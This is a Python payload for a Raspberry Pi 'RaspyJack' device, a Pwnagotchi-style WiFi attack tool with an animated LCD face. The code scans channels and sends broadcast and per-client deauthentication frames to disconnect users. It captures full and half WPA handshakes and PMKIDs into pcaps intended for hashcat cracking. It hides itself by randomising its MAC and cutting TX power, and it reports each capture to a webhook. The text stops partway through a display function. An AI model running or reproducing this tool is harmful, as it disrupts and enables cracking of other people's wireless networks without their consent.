#!/usr/bin/env python3
"""
RaspyJack Payload -- Pwnagotchi
================================
Author: 7h30th3r0n3

Automated WiFi handshake and PMKID hunter with pixel-art face UI.

Features:
  Full 4-way handshake capture (passive EAPOL sniffing)
  Half-handshake capture (2+ EAPOL messages, crackable with hashcat)
  PMKID capture via RSN IE parsing
  Auto-deauth with smart targeting (toggle ON/OFF)
  Broadcast + targeted deauth with adaptive interval
  Intelligent channel hopping (longer dwell on active channels 1,6,11)
  Whitelist MAC/SSID to exclude your own networks
  Stealth mode (MAC randomize + TX power reduction)
  Peer detection (other Raspyjack on the network)
  Discord/webhook notification on capture
  Capture flash (visual feedback on handshake)
  Persistent lifetime stats across sessions
  Pixel-art animated face with blink, pupil tracking, ZZZ
  Activity sparkline graph
  Channel activity stats view
  Capture history browser

Controls:
  OK         Start / Pause capture (session persists)
  UP / DOWN  Scroll stats
  LEFT/RIGHT Toggle deauth ON/OFF
  KEY1       Cycle views: face > stats > captures > whitelist
  KEY2       Toggle stealth mode
  KEY3       Exit (or back from sub-view)

Loot: /root/Raspyjack/loot/Pwnagotchi/
"""

import os
import sys
import time
import json
import signal
import threading
import subprocess
import random
import urllib.request
from datetime import datetime
from collections import deque

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads._iface_helper import select_interface

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, Dot11ProbeReq,
        Dot11Auth, Dot11AssoReq, RadioTap, EAPOL,
        sendp, sniff as scapy_sniff, wrpcap, conf, raw,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT

LOOT_DIR = "/root/Raspyjack/loot/Pwnagotchi"
STATS_FILE = os.path.join(LOOT_DIR, "lifetime_stats.json")
CONFIG_FILE = os.path.join(LOOT_DIR, "config.json")
HANDSHAKE_DIR = os.path.join(LOOT_DIR, "handshakes")

# Channel hopping: active channels get more dwell time
# 2.4 GHz channels
CHANNELS_24_PRIORITY = [1, 6, 11]
CHANNELS_24_OTHER = [2, 3, 4, 5, 7, 8, 9, 10, 12, 13]
CHANNELS_24_ALL = list(range(1, 14))
# 5 GHz channels (common UNII bands)
CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165]
DWELL_PRIORITY = 3
DWELL_OTHER = 1
DWELL_5GHZ = 2
DWELL_DEAUTH = 5          # stay on channel after deauth to catch EAPOL

DEAUTH_COUNT = 5
HALF_HS_MIN = 2  # minimum EAPOL msgs for half-handshake

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
_running = True
capturing = False
deauth_enabled = True
stealth_enabled = False
current_channel = 1
mood = "awake"
mood_text = "waking up..."
start_time = time.time()
last_capture_time = 0
capture_flash = 0  # countdown for flash effect

# Session stats (persist across pause/resume)
session_aps = {}
session_clients = {}
session_handshakes = 0
session_half_hs = 0
session_pmkid = 0
session_deauths = 0
captured_bssids = set()
eapol_buffer = {}
beacon_cache = {}  # bssid -> raw beacon pkt (for aircrack ESSID)
last_capture_ssid = ""

# Channel activity tracking for smart hopping
channel_activity = {ch: 0 for ch in range(1, 14)}  # live counters (reset every 10s for sparkline)
channel_total = {ch: 0 for ch in range(1, 166)}     # cumulative counters (never reset, for stats view)

# Activity sparkline history (sampled every 10s)
activity_history = deque([0] * 20, maxlen=20)
_last_activity_sample = time.time()

# Peer detection
peers_detected = set()

# Lifetime stats
lifetime_handshakes = 0
lifetime_half_hs = 0
lifetime_pmkid = 0
lifetime_networks = 0

# Whitelist
whitelist_macs = set()
whitelist_ssids = set()

# Webhook
webhook_url = ""

# Monitor interface
mon_iface = None
original_mac = ""

# View: face | stats | captures | whitelist
view = "face"

# Animation state
_blink = False
_next_blink = time.time() + random.uniform(5, 10)
_pupil_x = 0.0
_pupil_target = 0
_pupil_change_time = time.time() + random.uniform(2, 4)
_zzz_phase = 0.0


def _cleanup_signal(*_):
    global _running
    _running = False


signal.signal(signal.SIGINT, _cleanup_signal)
signal.signal(signal.SIGTERM, _cleanup_signal)

# ---------------------------------------------------------------------------
# Config / Stats
# ---------------------------------------------------------------------------


def _load_stats():
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid, lifetime_networks
    if os.path.isfile(STATS_FILE):
        try:
            with open(STATS_FILE, "r") as f:
                d = json.load(f)
            lifetime_handshakes = d.get("handshakes", 0)
            lifetime_half_hs = d.get("half_hs", 0)
            lifetime_pmkid = d.get("pmkid", 0)
            lifetime_networks = d.get("networks", 0)
        except Exception:
            pass


def _save_stats():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(STATS_FILE, "w") as f:
        json.dump({
            "handshakes": lifetime_handshakes,
            "half_hs": lifetime_half_hs,
            "pmkid": lifetime_pmkid,
            "networks": lifetime_networks,
            "last_session": datetime.now().isoformat(),
        }, f, indent=2)


def _load_config():
    global whitelist_macs, whitelist_ssids, deauth_enabled, webhook_url
    if os.path.isfile(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                d = json.load(f)
            whitelist_macs = set(d.get("whitelist_macs", []))
            whitelist_ssids = set(d.get("whitelist_ssids", []))
            deauth_enabled = d.get("deauth_enabled", True)
            webhook_url = d.get("webhook_url", "")
        except Exception:
            pass


def _save_config():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with open(CONFIG_FILE, "w") as f:
        json.dump({
            "whitelist_macs": sorted(whitelist_macs),
            "whitelist_ssids": sorted(whitelist_ssids),
            "deauth_enabled": deauth_enabled,
            "webhook_url": webhook_url,
        }, f, indent=2)


# ---------------------------------------------------------------------------
# Webhook notification
# ---------------------------------------------------------------------------


def _send_webhook(message):
    if not webhook_url:
        return
    try:
        data = json.dumps({"content": message}).encode("utf-8")
        req = urllib.request.Request(webhook_url, data=data,
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=5)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# Monitor mode + stealth
# ---------------------------------------------------------------------------


def _get_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip().upper()
    except Exception:
        return ""


def _randomize_mac(iface):
    """Randomize MAC address for stealth."""
    new_mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", new_mac],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _restore_mac(iface, mac):
    if not mac:
        return
    subprocess.run(["sudo", "ip", "link", "set", iface, "down"],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "address", mac],
                   capture_output=True, timeout=5)
    subprocess.run(["sudo", "ip", "link", "set", iface, "up"],
                   capture_output=True, timeout=5)


def _reduce_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "fixed", "500"],
                   capture_output=True, timeout=5)


def _restore_tx_power(iface):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "txpower", "auto"],
                   capture_output=True, timeout=5)


def _monitor_up(iface):
    for cmd in [
        ["sudo", "ip", "link", "set", iface, "down"],
        ["sudo", "iw", iface, "set", "monitor", "none"],
        ["sudo", "ip", "link", "set", iface, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)
    time.sleep(0.5)
    r = subprocess.run(["iw", "dev", iface, "info"], capture_output=True, text=True, timeout=5)
    if "type monitor" in r.stdout:
        return iface
    subprocess.run(["sudo", "airmon-ng", "start", iface],
                   capture_output=True, timeout=15)
    for name in (f"{iface}mon", iface):
        r = subprocess.run(["iw", "dev", name, "info"], capture_output=True, text=True,
                           timeout=5)
        if "type monitor" in r.stdout:
            return name
    return None


def _monitor_down(iface):
    if not iface:
        return
    base = iface.replace("mon", "")
    subprocess.run(["sudo", "airmon-ng", "stop", iface],
                   capture_output=True, timeout=10)
    for cmd in [
        ["sudo", "ip", "link", "set", base, "down"],
        ["sudo", "iw", base, "set", "type", "managed"],
        ["sudo", "ip", "link", "set", base, "up"],
    ]:
        subprocess.run(cmd, capture_output=True, timeout=5)


def _set_channel(iface, ch):
    subprocess.run(["sudo", "iw", "dev", iface, "set", "channel", str(ch)],
                   capture_output=True, timeout=3)


# ---------------------------------------------------------------------------
# Mood engine
# ---------------------------------------------------------------------------


def _update_mood():
    global mood, mood_text
    with lock:
        aps = len(session_aps)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        last = last_capture_ssid
        peers = len(peers_detected)
        stlth = stealth_enabled

    if stlth:
        mood = "stealth"
        mood_text = "ghost mode active"
        return

    elapsed = time.time() - start_time
    t = time.time()

    if capture_flash > 0:
        mood = "happy"
        mood_text = f"PWNED {last[:14]}!"
        return

    if peers > 0 and int(t) % 20 < 3:
        mood = "friend"
        mood_text = f"{peers} peer(s) nearby!"
        return

    if hs + hhs > 0 and int(t) % 25 < 4:
        mood = "happy"
        mood_text = f"{hs} full + {hhs} half HS"
        return

    if pm > 0 and int(t) % 25 < 4:
        mood = "grateful"
        mood_text = f"{pm} PMKID captured!"
        return

    if last and int(t) % 18 < 3:
        mood = "excited"
        mood_text = f">{last[:16]}"
        return

    if deauths > 0 and int(t) % 12 < 2:
        mood = "intense"
        mood_text = f"deauth x{deauths}"
        return

    if aps > 15:
        mood = "excited"
        mood_text = f"{aps} networks!"
    elif aps > 5:
        mood = "cool"
        mood_text = "hunting..."
    elif aps > 0:
        mood = "awake"
        mood_text = "scanning targets"
    elif elapsed > 300:
        mood = "lonely"
        mood_text = "where is everyone?"
    elif elapsed > 120:
        mood = "bored"
        mood_text = "nothing here..."
    elif not capturing:
        mood = "sleeping"
        mood_text = "zzZZZzz"
    else:
        mood = "awake"
        mood_text = "looking around..."


# ---------------------------------------------------------------------------
# Packet handler
# ---------------------------------------------------------------------------


def _is_whitelisted(bssid, essid=""):
    if (bssid or "").upper() in whitelist_macs:
        return True
    if essid and essid in whitelist_ssids:
        return True
    return False


def _save_capture(bssid, essid, pkts, capture_type="hs"):
    os.makedirs(HANDSHAKE_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe = "".join(c if c.isalnum() else "_" for c in essid)[:20]
    fname = f"{capture_type}_{safe}_{ts}.pcap"
    wrpcap(os.path.join(HANDSHAKE_DIR, fname), pkts)
    return fname


def _packet_handler(pkt):
    global session_handshakes, session_half_hs, session_pmkid
    global lifetime_handshakes, lifetime_half_hs, lifetime_pmkid
    global lifetime_networks, last_capture_ssid, last_capture_time, capture_flash

    if not _running or not capturing:
        return

    # -- Beacons: discover APs --
    if pkt.haslayer(Dot11Beacon):
        bssid = (pkt[Dot11].addr2 or "").upper()
        if not bssid or bssid == "FF:FF:FF:FF:FF:FF":
            return
        try:
            essid = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
        except Exception:
            essid = ""
        if not essid:
            essid = "<hidden>"
        if _is_whitelisted(bssid, essid):
            return
        # Cache raw beacon for inclusion in handshake pcaps
        if bssid not in beacon_cache:
            beacon_cache[bssid] = pkt
        sig = getattr(pkt, "dBm_AntSignal", -99)
        with lock:
            if bssid not in session_aps:
                session_aps[bssid] = {
                    "essid": essid, "channel": current_channel,
                    "signal": sig, "clients": set(), "last_seen": time.time(),
                }
            else:
                session_aps[bssid]["signal"] = sig
                session_aps[bssid]["last_seen"] = time.time()
            channel_activity[current_channel] = channel_activity.get(current_channel, 0) + 1
            channel_total[current_channel] = channel_total.get(current_channel, 0) + 1

        # PMKID extraction moved to EAPOL M1 handler below

    # -- Data frames: discover clients --
    if pkt.haslayer(Dot11) and pkt[Dot11].type == 2:
        src = (pkt[Dot11].addr2 or "").upper()
        bss = (pkt[Dot11].addr3 or "").upper()
        if bss in session_aps and src != bss and src != "FF:FF:FF:FF:FF:FF":
            with lock:
                session_aps[bss]["clients"].add(src)
                session_clients[src] = bss
                channel_activity[current_channel] = (
                    channel_activity.get(current_channel, 0) + 1
                )

    # -- Probe requests: peer detection --
    if pkt.haslayer(Dot11ProbeReq):
        try:
            ssid_raw = pkt[Dot11Elt].info.decode("utf-8", errors="replace")
            if ssid_raw.startswith("RJ_PEER_"):
                with lock:
                    peers_detected.add((pkt[Dot11].addr2 or "").upper())
        except Exception:
            pass

    # -- EAPOL: handshake + PMKID capture --
    if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
        src = (pkt[Dot11].addr2 or "").upper()
        dst = (pkt[Dot11].addr1 or "").upper()
        pair = tuple(sorted([src, dst]))

        with lock:
            if pair not in eapol_buffer:
                eapol_buffer[pair] = []
            eapol_buffer[pair].append(pkt)
            msg_count = len(eapol_buffer[pair])

            # Find associated BSSID
            bssid = None
            for mac in pair:
                if mac in session_aps:
                    bssid = mac
                    break

            # PMKID extraction from EAPOL M1 Key Data
            # M1 is sent by AP (src=bssid), has ANonce but no MIC
            if bssid and bssid == src and bssid not in captured_bssids:
                try:
                    eapol_raw = bytes(pkt[EAPOL])
                    # EAPOL-Key: type(1) + info(2) + keylen(2) + replay(8)
                    #            + nonce(32) + iv(16) + rsc(8) + id(8)
                    #            + mic(16) + data_len(2) + data(...)
                    if len(eapol_raw) > 99:
                        key_info = int.from_bytes(eapol_raw[5:7], "big")
                        # M1: pairwise=1, ack=1, mic=0
                        is_m1 = (key_info & 0x08) and (key_info & 0x80) and not (key_info & 0x100)
                        if is_m1:
                            data_len = int.from_bytes(eapol_raw[97:99], "big")
                            key_data = eapol_raw[99:99 + data_len]
                            # Search for PMKID in RSN KDE: OUI 00-0F-AC, type 4
                            i = 0
                            while i + 6 < len(key_data):
                                kde_type = key_data[i]
                                kde_len = key_data[i + 1]
                                if kde_type == 0xdd and kde_len >= 20:
                                    oui = key_data[i + 2:i + 5]
                                    data_type = key_data[i + 5]
                                    if oui == b'\x00\x0f\xac' and data_type == 4:
                                        pmkid = key_data[i + 6:i + 22]
                                        if pmkid != b'\x00' * 16:
                                            captured_bssids.add(bssid)
                                            session_pmkid += 1
                                            lifetime_pmkid += 1
                                            lifetime_networks += 1
                                            essid_pm = session_aps.get(bssid, {}).get("essid", "unknown")
                                            last_capture_ssid = essid_pm
                                            last_capture_time = time.time()
                                            capture_flash = 30
                                            # Save beacon + M1 for hcxpcapngtool
                                            save_pkts = []
                                            if bssid in beacon_cache:
                                                save_pkts.append(beacon_cache[bssid])
                                            save_pkts.append(pkt)
                                            _save_capture(bssid, essid_pm,
                                                          save_pkts, "pmkid")
                                            _save_stats()
                                            threading.Thread(
                                                target=_send_webhook,
                                                args=(f"PMKID captured: {essid_pm} ({bssid})",),
                                                daemon=True,
                                            ).start()
                                        break
                                i += 2 + kde_len if kde_len > 0 else i + 2
                except Exception:
                    pass

            if bssid and bssid not in captured_bssids:
                essid = session_aps.get(bssid, {}).get("essid", "unknown")

                if msg_count >= 4:
                    # Full 4-way handshake
                    captured_bssids.add(bssid)
                    session_handshakes += 1
                    lifetime_handshakes += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = time.time()
                    capture_flash = 30
                    save_pkts = []
                    if bssid in beacon_cache:
                        save_pkts.append(beacon_cache[bssid])
                    save_pkts.extend(eapol_buffer[pair])
                    fname = _save_capture(bssid, essid,
                                          save_pkts, "hs4")
                    _save_stats()
                    threading.Thread(
                        target=_send_webhook,
                        args=(
                            f"Full handshake: {essid} ({bssid}) "
                            f"saved as {fname}",
                        ),
                        daemon=True,
                    ).start()
                    eapol_buffer[pair] = []

                elif msg_count >= HALF_HS_MIN and msg_count < 4:
                    # Check timeout handled in _half_hs_checker
                    pass

            # Trim old buffers
            if msg_count > 8:
                eapol_buffer[pair] = eapol_buffer[pair][-4:]


# ---------------------------------------------------------------------------
# Half-handshake checker thread
# ---------------------------------------------------------------------------


def _half_hs_checker():
    """Periodically check for stale EAPOL buffers and save half-handshakes."""
    global session_half_hs, lifetime_half_hs, last_capture_ssid
    global last_capture_time, capture_flash

    while _running and capturing:
        time.sleep(10)
        if not _running or not capturing:
            break

        with lock:
            now = time.time()
            stale_pairs = []
            for pair, pkts in eapol_buffer.items():
                if len(pkts) >= HALF_HS_MIN and len(pkts) < 4:
                    try:
                        first_time = (pkts[0].time
                                      if hasattr(pkts[0], 'time')
                                      else now - 20)
                        if now - first_time > 15:
                            stale_pairs.append(pair)
                    except Exception:
                        stale_pairs.append(pair)

            for pair in stale_pairs:
                pkts = eapol_buffer.pop(pair, [])
                if len(pkts) < HALF_HS_MIN:
                    continue
                bssid = None
                for mac in pair:
                    if mac in session_aps:
                        bssid = mac
                        break
                if bssid and bssid not in captured_bssids:
                    essid = session_aps.get(bssid, {}).get("essid", "unknown")
                    captured_bssids.add(bssid)
                    session_half_hs += 1
                    lifetime_half_hs += 1
                    lifetime_networks += 1
                    last_capture_ssid = essid
                    last_capture_time = now
                    capture_flash = 20
                    save_pkts = []
                    if bssid in beacon_cache:
                        save_pkts.append(beacon_cache[bssid])
                    save_pkts.extend(pkts)
                    _save_capture(bssid, essid, save_pkts, "hs_half")
                    _save_stats()
                    threading.Thread(
                        target=_send_webhook,
                        args=(f"Half handshake ({len(pkts)} msgs): {essid}",),
                        daemon=True,
                    ).start()


# ---------------------------------------------------------------------------
# Capture threads
# ---------------------------------------------------------------------------


def _channel_hopper():
    """Smart channel hopping with integrated deauth.

    Strategy:
    - Build a prioritised channel schedule based on known APs and clients
    - Channels with uncaptured APs that have clients get deauth + long dwell
    - Other channels get short scan dwell
    - 5GHz treated equally when APs are known on those channels
    - After deauth, stay on channel to capture EAPOL response
    """
    global current_channel, session_deauths
    supported_5g = set()   # 5GHz channels the adapter actually supports
    checked_5g = set()     # channels we already tried

    def _dwell(seconds):
        for _ in range(int(seconds * 10)):
            if not _running or not capturing:
                return False
            time.sleep(0.1)
        return True

    def _hop(ch):
        """Set channel, return True if successful."""
        global current_channel
        if ch > 14 and ch in checked_5g and ch not in supported_5g:
            return False  # known unsupported
        r = subprocess.run(
            ["sudo", "iw", "dev", mon_iface, "set", "channel", str(ch)],
            capture_output=True, timeout=3,
        )
        if ch > 14:
            checked_5g.add(ch)
            if r.returncode == 0:
                supported_5g.add(ch)
            else:
                return False
        with lock:
            current_channel = ch
        return True

    def _do_deauth_on_channel(ch):
        """Deauth uncaptured APs on this channel. Returns number deauthed."""
        if not deauth_enabled:
            return 0
        with lock:
            targets = []
            for bssid, info in session_aps.items():
                if info.get("channel") != ch:
                    continue
                if _is_whitelisted(bssid, info.get("essid", "")):
                    continue
                if bssid in captured_bssids:
                    continue
                clients = list(info.get("clients", set()))
                sig = info.get("signal", -99)
                targets.append((bssid, clients, sig))

        if not targets:
            return 0

        # Sort: most clients first, then best signal
        targets.sort(key=lambda x: (len(x[1]), x[2] + 100), reverse=True)
        count = 0

        for bssid, clients, _ in targets:
            try:
                # Broadcast deauth
                broadcast = (
                    RadioTap()
                    / Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=bssid,
                            addr3=bssid, type=0, subtype=12)
                    / Dot11Deauth(reason=7)
                )
                sendp(broadcast, iface=mon_iface, count=DEAUTH_COUNT,
                      inter=0.02, verbose=False)

                # Targeted deauth for each client (bidirectional)
                for client in clients:
                    d2c = (
                        RadioTap()
                        / Dot11(addr1=client, addr2=bssid, addr3=bssid,
                                type=0, subtype=12)
                        / Dot11Deauth(reason=7)
                    )
                    d2a = (
                        RadioTap()
                        / Dot11(addr1=bssid, addr2=client, addr3=bssid,
                                type=0, subtype=12)
                        / Dot11Deauth(reason=7)
                    )
                    sendp(d2c, iface=mon_iface, count=DEAUTH_COUNT,
                          inter=0.02, verbose=False)
                    sendp(d2a, iface=mon_iface, count=DEAUTH_COUNT,
                          inter=0.02, verbose=False)

                count += 1
                with lock:
                    session_deauths += 1
            except Exception:
                pass

        return count

    while _running and capturing:
        # --- Build smart channel schedule ---
        with lock:
            # Channels with uncaptured APs sorted by client count
            hot_channels = {}  # ch -> (total_clients, has_uncaptured)
            for bssid, info in session_aps.items():
                ch = info.get("channel", 0)
                if not ch:
                    continue
                cli = len(info.get("clients", set()))
                uncap = bssid not in captured_bssids and not _is_whitelisted(
                    bssid, info.get("essid", ""))
                prev = hot_channels.get(ch, (0, False))
                hot_channels[ch] = (prev[0] + cli, prev[1] or uncap)

        # Phase 1: Hot channels (have uncaptured APs with clients)
        hot_list = [
            (ch, cli, uncap) for ch, (cli, uncap) in hot_channels.items()
            if uncap and cli > 0
        ]
        hot_list.sort(key=lambda x: x[1], reverse=True)

        for ch, _, _ in hot_list:
            if not _running or not capturing:
                return
            if not _hop(ch):
                continue
            # Deauth + long dwell to capture response
            deauthed = _do_deauth_on_channel(ch)
            dwell_time = DWELL_DEAUTH if deauthed > 0 else DWELL_PRIORITY
            if not _dwell(dwell_time):
                return

        # Phase 2: All 2.4GHz channels (discovery)
        for ch in CHANNELS_24_ALL:
            if not _running or not capturing:
                return
            if not _hop(ch):
                continue
            # Quick deauth if there are targets
            deauthed = _do_deauth_on_channel(ch)
            dwell_time = DWELL_DEAUTH if deauthed > 0 else (
                DWELL_PRIORITY if ch in CHANNELS_24_PRIORITY else DWELL_OTHER
            )
            if not _dwell(dwell_time):
                return

        # Phase 3: 5GHz channels
        for ch in CHANNELS_5:
            if not _running or not capturing:
                return
            if not _hop(ch):
                continue
            deauthed = _do_deauth_on_channel(ch)
            dwell_time = DWELL_DEAUTH if deauthed > 0 else DWELL_5GHZ
            if not _dwell(dwell_time):
                return

        # Stealth: randomize MAC between cycles
        if stealth_enabled and mon_iface:
            _randomize_mac(mon_iface)


def _sniffer():
    if not SCAPY_OK or not mon_iface:
        return
    try:
        scapy_sniff(
            iface=mon_iface,
            prn=_packet_handler,
            stop_filter=lambda _: not _running or not capturing,
            store=0,
        )
    except Exception:
        pass


    # _deauther is now integrated into _channel_hopper for channel sync


def _activity_sampler():
    """Sample channel activity every 10s for the sparkline."""
    while _running:
        time.sleep(10)
        if not _running:
            break
        with lock:
            total = sum(channel_activity.values())
        activity_history.append(total)
        # Reset counters for next sample window
        with lock:
            for ch in channel_activity:
                channel_activity[ch] = 0


# ---------------------------------------------------------------------------
# Animation helpers
# ---------------------------------------------------------------------------


def _update_animation():
    """Update blink/pupil/zzz animation state. Called each frame."""
    global _blink, _next_blink, _pupil_x, _pupil_target
    global _pupil_change_time, _zzz_phase

    now = time.time()

    # Blink logic
    if _blink:
        # blink lasts ~0.2s
        if now > _next_blink + 0.2:
            _blink = False
            _next_blink = now + random.uniform(5, 10)
    else:
        if now >= _next_blink:
            _blink = True

    # Pupil tracking: smooth interpolation toward target
    if now >= _pupil_change_time:
        _pupil_target = random.randint(-2, 2)
        _pupil_change_time = now + random.uniform(2, 4)
    diff = _pupil_target - _pupil_x
    _pupil_x += diff * 0.3  # smooth ease

    # ZZZ floating phase
    _zzz_phase = (now * 0.5) % 3.0


# ---------------------------------------------------------------------------
# Pixel art face drawing
# ---------------------------------------------------------------------------


FACES = {
    "awake":    "(  o . o  )",
    "happy":    "(  ^ . ^  )",
    "excited":  "(  * . *  )",
    "cool":     "(  - . -  )",
    "intense":  "(  @ . @  )",
    "bored":    "(  . . .  )",
    "lonely":   "(  ; . ;  )",
    "sad":      "(  T . T  )",
    "sleeping": "(  -  _  -  )",
    "grateful": "(  > . <  )",
    "friend":   "(  o . O  )",
    "stealth":  "(  # . #  )",
}

def _draw_pixel_face(d, face_mood, blink, pupil_offset_x):
    """Draw ASCII face centered in the top area (y=0..40, base-128)."""
    try:
        face_font = scaled_font(14)
    except Exception:
        face_font = font_obj
    face_text = FACES.get(face_mood, FACES["awake"])
    if blink:
        face_text = "(  -  .  -  )"
    face_color = "#00FF00" if capturing else "#666666"
    if capture_flash > 0:
        face_color = "#FFFF00"
    if stealth_enabled:
        face_color = "#8800FF"
    # Center face using anchor="mm" (middle-middle) at center of face area
    d.text((63, 20), face_text, font=face_font, fill=face_color, anchor="mm")


# ---------------------------------------------------------------------------
# Sparkline drawing
# ---------------------------------------------------------------------------


def _draw_sparkline(d, x, y, w, h, data):
    """Draw a mini bar chart from a deque of values."""
    if not data or max(data) == 0:
        d.rectangle((x, y, x + w, y + h), outline="#222")
        return
    mx = max(data)
    bar_w = max(1, w // len(data))
    for i, v in enumerate(data):
        bh = max(0, int(v / mx * h))
        bx = x + i * bar_w
        if v > mx * 0.6:
            color = "#00FF00"
        elif v > mx * 0.2:
            color = "#FFAA00"
        else:
            color = "#FF4444"
        if bh > 0:
            d.rectangle((bx, y + h - bh, bx + bar_w - 1, y + h), fill=color)


# ---------------------------------------------------------------------------
# LCD Drawing -- Face view
# ---------------------------------------------------------------------------


def _draw_face(lcd, font_obj, font_sm):
    global capture_flash
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    _update_mood()
    _update_animation()

    with lock:
        ch = current_channel
        aps = len(session_aps)
        total_clients = len(session_clients)
        hs = session_handshakes
        hhs = session_half_hs
        pm = session_pmkid
        deauths = session_deauths
        lt_hs = lifetime_handshakes
        lt_hhs = lifetime_half_hs
        lt_pm = lifetime_pmkid
        last = last_capture_ssid
        cap = capturing
        deauth_on = deauth_enabled
        stlth = stealth_enabled
        peers = len(peers_detected)

    # Capture flash effect (bright green border flash)
    if capture_flash > 0:
        capture_flash -= 1
        if capture_flash % 6 < 3:
            d.rectangle((0, 0, 127, 3), fill="#00FF00")
            d.rectangle((0, 124, 127, 127), fill="#00FF00")
            d.rectangle((0, 0, 3, 127), fill="#00FF00")
            d.rectangle((124, 0, 127, 127), fill="#00FF00")

    # Uptime
    elapsed = int(time.time() - start_time)
    h_val = elapsed // 3600
    m_val = (elapsed % 3600) // 60
    s_val = elapsed % 60
    uptime = f"{h_val:02d}:{m_val:02d}:{s_val:02d}"

    # -- Pixel art face (y=0..40) --
    _draw_pixel_face(d, mood, _blink, _pupil_x)

    # Separator
    d.line([(0, 41), (127, 41)], fill="#333")

    y = 43

    # CH + Mode
    d.text((2, y), f"CH:{ch}", font=font_sm, fill="#FFAA00")
    mode_parts = []
    if cap:
        mode_parts.append("AUTO")
    if deauth_on:
        mode_parts.append("DTH")
    if stlth:
        mode_parts.append("STH")
    d.text((36, y), "+".join(mode_parts) or "IDLE",
           font=font_sm, fill="#58a6ff")
    y += 12

    # AP + CLI + Peers
    d.text((2, y), f"AP:{aps}", font=font_sm, fill="#00FF00")
    d.text((40, y), f"CLI:{total_clients}", font=font_sm, fill="#00CCFF")
    if peers > 0:
        d.text((90, y), f"P:{peers}", font=font_sm, fill="#FF00FF")
    y += 12

    # PWND
    total_pwnd = hs + hhs + pm
    lt_total = lt_hs + lt_hhs + lt_pm
    pwnd_color = "#00FF00" if total_pwnd > 0 else "#888"
    d.text((2, y), f"PWND:{hs}+{hhs}h+{pm}p", font=font_sm, fill=pwnd_color)
    d.text((90, y), f"({lt_total})", font=font_sm, fill="#666")
    y += 12

    # Uptime
    d.text((2, y), f"UP:{uptime}", font=font_sm, fill="#888")
    y += 12

    # Last capture
    if last:
        d.text((2, y), f">{last[:20]}", font=font_sm, fill="#00FF00")
        y += 12

    # Sparkline (activity graph, last 20 samples)
    _draw_sparkline(d, 2, y, 123, 10, activity_history)

    # Footer
    d.rectangle((0, 116, 127, 127), fill="#111")
    if cap:
        d.text((2, 117), "OK:Pse L/R:Dth K2:Sth",
               font=font_sm, fill="#888")
    else:
        d.text((2, 117), "OK:Go K1:View K2:Sth K3:X",
               font=font_sm, fill="#888")

    lcd.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# LCD Drawing -- Stats view (channel activity + top APs)
# ---------------------------------------------------------------------------


def _draw_stats(lcd, font_obj, font_sm, scroll):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)

    with lock:
        ch_act = dict(channel_total)
        cur_ch = current_channel
        aps_snap = dict(session_aps)
        clients_snap = len(session_clients)
        captured = set(captured_bssids)

    # All channels: 2.4GHz (1-13) + all 5GHz
    all_channels = list(range(1, 14)) + list(CHANNELS_5)

    # Scroll = selected channel index, controlled by LEFT/RIGHT
    sel_idx = max(0, min(scroll, len(all_channels) - 1))
    sel_ch = all_channels[sel_idx]

    # --- Header: selected channel info (y=0-11) ---
    is_5g = sel_ch > 14
    band_label = "5G" if is_5g else "2.4"
    band_color = "#FF00FF" if is_5g else "#58a6ff"
    act_sel = ch_act.get(sel_ch, 0)
    d.rectangle((0, 0, 127, 11), fill="#111")
    d.text((2, 1), f"CH{sel_ch}", font=font_sm, fill="#FFFFFF")
    d.text((30, 1), band_label, font=font_sm, fill=band_color)
    d.text((48, 1), f"p:{act_sel}", font=font_sm, fill="#FFAA00")
    d.text((80, 1), f"AP:{len(aps_snap)} C:{clients_snap}",
           font=font_sm, fill="#888")

    # --- Channel bar (y=12-22): horizontal scrolling strip ---
    strip_y = 13
    # Show 13 channels centered on selection
    strip_size = 13
    strip_half = strip_size // 2
    strip_start = max(0, sel_idx - strip_half)
    strip_start = min(strip_start, max(0, len(all_channels) - strip_size))
    strip_end = min(len(all_channels), strip_start + strip_size)
